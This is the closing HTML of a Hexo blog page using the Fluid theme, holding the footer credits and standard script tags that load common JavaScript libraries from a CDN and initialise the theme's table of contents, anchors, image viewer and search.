       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
